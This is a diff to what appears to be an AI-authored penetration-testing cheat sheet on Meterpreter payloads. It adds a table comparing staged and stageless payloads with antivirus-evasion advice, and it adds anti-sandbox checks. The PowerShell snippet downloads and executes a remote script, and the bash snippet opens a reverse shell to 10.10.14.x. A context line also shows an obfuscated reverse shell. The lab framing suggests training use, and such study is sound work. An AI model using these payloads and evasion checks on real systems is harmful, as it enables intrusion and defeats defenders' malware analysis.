@@ -322,6 +322,58 @@ windows/x64/meterpreter_reverse_tcp  → stageless meterpreter
 windows/x64/meterpreter/reverse_tcp  → staged meterpreter
 ```
 
+**When to use which:**
+
+| Situation | Use |
+|---|---|
+| No outbound internet on target (air-gapped, no DNS) | **Stageless** — full payload delivered in one shot |
+| Payload size limit (email attachment, URL length, buffer) | **Staged** — small stager fits where full payload won't |
+| Reliability is critical, C2 must work on first hit | **Stageless** — no second-stage download to fail |
+| MSF multi/handler is your listener | Either — handler auto-detects |
+| AV evasion priority | **Stageless** via a loader (Donut/ScareCrow) — more control over delivery than staged download |
+
+### Anti-Sandbox Checks
+
+Before connecting back, verify the target is a real host rather than an automated sandbox. Sandboxes typically have short execution timeouts, few processes, low RAM, and generic hostnames.
+
+```powershell
+# PowerShell — check for sandbox indicators before executing payload
+$sandbox = $false
+
+# Generic computer name
+if ($env:COMPUTERNAME -match "^(WIN|DESKTOP|SANDBOX|MALTEST|CUCKOO|VIRUS|BOX)\d*$") { $sandbox = $true }
+
+# Very low RAM (sandboxes usually allocate < 2-4 GB)
+$ram = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
+if ($ram -lt 2) { $sandbox = $true }
+
+# Very few running processes (sandboxes often have < 20)
+if ((Get-Process).Count -lt 20) { $sandbox = $true }
+
+# No user activity — check last input time via GetLastInputInfo
+# (advanced — skip in simple checks)
+
+if (-not $sandbox) {
+    # Execute payload
+    IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.x/shell.ps1")
+}
+```
+
+```bash
+# Linux — basic sandbox check before callback
+sandbox=0
+
+# Fewer than 50 processes = likely sandbox
+[ $(ps aux | wc -l) -lt 50 ] && sandbox=1
+
+# Very low uptime = fresh sandbox detonation
+[ $(awk '{print int($1)}' /proc/uptime) -lt 300 ] && sandbox=1
+
+[ $sandbox -eq 0 ] && bash -i >& /dev/tcp/10.10.14.x/4444 0>&1
+```
+
+> [!note] Anti-sandbox checks matter most when using staged payloads against hardened targets where burning a C2 domain or IP is costly. For HTB labs, skip these — sandboxing isn't a factor.
+
 ### Common payloads
 
 ```bash
@@ -501,5 +553,5 @@ c=bas;h=h;$c$h -i >& /dev/tcp/10.10.14.x/4444 0>&1
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
